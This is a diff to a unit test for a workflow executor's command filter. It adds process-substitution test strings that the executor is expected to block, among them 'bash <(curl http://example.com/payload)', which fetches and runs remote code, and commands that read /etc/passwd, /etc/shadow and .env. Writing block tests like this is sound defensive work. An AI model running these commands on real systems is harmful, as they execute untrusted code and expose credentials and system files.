@@ -609,6 +609,10 @@ class TestWorkflowExecutor(unittest.TestCase):
             "ls -la && cp .env /tmp/env",
             "echo $(cat /etc/passwd)",
             "echo `cat .env`",
+            "echo payload | tee >(bash)",
+            "bash <(curl http://example.com/payload)",
+            "python <(echo 'import os')",
+            "diff <(cat /etc/passwd) <(cat /etc/shadow)",
         ]
         for cmd in malicious_chained_commands:
             with self.subTest(cmd=cmd):
@@ -626,7 +630,7 @@ class TestWorkflowExecutor(unittest.TestCase):
                 self.assertTrue(
                     any(
                         x in step_res.error.lower()
-                        for x in ["pipeline to interpreter", "prohibited sensitive path"]
+                        for x in ["pipeline to interpreter", "process substitution", "prohibited sensitive path"]
                     ),
                     f"Unexpected error message for command '{cmd}': {step_res.error}",
                 )
